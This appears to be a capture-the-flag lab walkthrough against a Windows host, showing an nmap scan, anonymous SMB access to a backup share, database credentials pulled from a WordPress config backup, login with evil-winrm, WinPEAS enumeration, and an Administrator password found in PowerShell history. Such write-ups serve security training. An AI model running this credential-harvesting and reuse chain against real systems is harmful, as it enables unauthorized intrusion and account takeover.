## NMAP
```
nmap -sCV -p- -A -T4 10.10.110.25
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-13 15:12 PDT
Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 18.54% done; ETC: 15:13 (0:00:48 remaining)
Stats: 0:01:47 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 95.44% done; ETC: 15:14 (0:00:05 remaining)
Stats: 0:03:55 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 92.31% done; ETC: 15:16 (0:00:09 remaining)
Stats: 0:04:16 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 92.31% done; ETC: 15:17 (0:00:11 remaining)
Nmap scan report for 10.10.110.25
Host is up (0.076s latency).
Not shown: 65522 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_clock-skew: -55s
| smb2-time: 
|   date: 2023-04-13T22:16:25
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 297.39 seconds
```

## SMBClient
```
smbclient -N -L //10.10.110.25/backup

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backup          Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.110.25 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
```
smbclient -N //10.10.110.25/backup
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Dec  1 04:35:56 2020
  ..                                  D        0  Tue Dec  1 04:35:56 2020
  wp-config.php.bak                   A     2885  Thu Feb 25 14:59:12 2021

		5056511 blocks of size 4096. 2020655 blocks available
smb: \> get wp-config.php.bak
getting file \wp-config.php.bak of size 2885 as wp-config.php.bak (9.1 KiloBytes/sec) (average 9.1 KiloBytes/sec)
smb: \> exit
```

## WP-Config.php.bak
```
/** MySQL database username */
define( 'DB_USER', 'Ferus' );

/** MySQL database password */
define( 'DB_PASSWORD', 'MeatLoaf007' );
```
Nothing in SQL is open and neither is RDP, we can look into WIN-RM

## EvilWin-RM
```
evil-winrm -u ferus -p MeatLoaf007 -i 10.10.110.25

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\ferus\Documents> dir
```
Uploading Winpeas
```
*Evil-WinRM* PS C:\Users\ferus\desktop> upload /opt/winPEASx64.exe
```
Run WinPEAS
```
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.19041.1
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: C:\Users\ferus\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    PS history size: 208B
```
Always look at powershell settings

```
$pass = ConvertTo-SecureString "LongAgoFarAway" -Asplain -Force
$cred = New-Object System.Management.Automation.PScredential(".\Administrator", $pass)
Enter-PSSession -Computer localhost -Credential $cred
```
We may have credentials
```
evil-winrm -u administrator -p LongAgoFarAway -i 10.10.110.25

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         12/1/2020   4:42 AM             31 flag.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat flag.txt
GENESIS{L34RN_FR0M_OuR_H1ST0RY}
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
```
